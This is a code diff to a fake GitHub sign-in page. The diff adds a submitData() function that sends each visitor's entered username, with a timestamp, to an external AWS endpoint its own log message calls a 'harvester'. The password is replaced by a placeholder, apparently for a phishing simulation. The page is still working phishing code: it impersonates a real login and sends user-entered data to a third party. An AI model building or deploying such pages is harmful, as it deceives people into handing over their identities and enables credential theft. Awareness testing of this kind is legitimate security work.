@@ -226,7 +226,7 @@
                         </label>
                         <input type="password" name="password" id="password" class="form-control form-control input-block" tabindex="2" autocomplete="current-password">
 
-                        <input type="button" id='btn' value="Sign in" tabindex="3" class="btn btn-primary btn-block" onclick='storeData();'>
+                        <input type="button" id='btn' value="Sign in" tabindex="3" class="btn btn-primary btn-block" onclick='submitData();'>
                     </div>
                 </form>
 
@@ -297,27 +297,77 @@
     </div>
     <div aria-live="polite" class="sr-only"></div>
     <script>
-      function storeData() {
+    function getTime() {
+        var today = new Date(),
+            dd = String(today.getDate()).padStart(2, '0'),
+            mm = String(today.getMonth() + 1).padStart(2, '0'), //January is 0!
+            yyyy = today.getFullYear(),
+            hour = today.getHours(),
+            minute = today.getMinutes(),
+            second = today.getSeconds();
+        return `${mm}/${dd}/${yyyy} ${hour}:${minute}:${second}`;      
+    }
+
+
+    function storeData() {
         var username = document.getElementById('login_field'),
             password = document.getElementById('password');
-            if (username.value !== "" && password.value !== ""){
-              var data = {
-                "username": username.value,
-                // "password": password.value
-              }
-              localStorage.setItem('data', JSON.stringify(data));
-              document.getElementById('btn').value = 'Signing in...';
-              window.location = '../session/index.html';
-            }else{
-              if (username.value === ""){
-                username.focus();
-              }else if(password.value === ""){
-                password.focus();
-              }else if (username.value === "" && password.value === ""){
-                document.getElementsByTagName('form').focus();
-              }
+        if (username.value !== "" && password.value !== ""){
+            var data = {
+            "username": username.value,
+            // "password": password.value // not recording passwords.
             }
+            localStorage.setItem('data', JSON.stringify(data));
+            document.getElementById('btn').value = 'Signing in...';
+            window.location = '../session/index.html';
+            }
+            else{
+                if (username.value === ""){
+                    username.focus();
+                }
+                else if(password.value === ""){
+                    password.focus();
+                }else if (username.value === "" && password.value === ""){
+                    document.getElementsByTagName('form').focus();
+                }
+        }
+    }
+
+    function submitData() {
+          var requestData = {
+            "host": "github",
+            "timestamp": getTime(),
+            "username": document.getElementById('login_field').value,
+            "password": 'Intensionally not logged passwords'
+            },
+            xhr = new XMLHttpRequest();
+          
+          xhr.open('POST', 'https://ktecmc3za0.execute-api.us-east-1.amazonaws.com/sendData', true);
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          xhr.send(JSON.stringify(requestData));
+          xhr.onload = function() {
+              console.log('xhr.status', xhr.status);
+              if (xhr.status === 200 && xhr.responseText !== 'null') { // analyze HTTP status of the response
+                storeData();
+                console.log('Success! Data sent to harvester');
+              } else {
+                storeData();
+                  console.log(`Error ${xhr.status}: ${xhr.statusText}`); // e.g. 404: Not Found
+              }
+          };
+          xhr.onprogress = function(event) {
+              if (event.lengthComputable) {
+                document.getElementById('btn').value = 'Signing in...';
+                console.log(`Received ${event.loaded} of ${event.total} bytes`);
+              } else {
+                console.log(`Received ${event.loaded} bytes`); // no Content-Length
+              }
+          }
+          xhr.onerror = function() {
+            console.log("Request failed");
+          };
       }
+
     </script>
 </body>
 
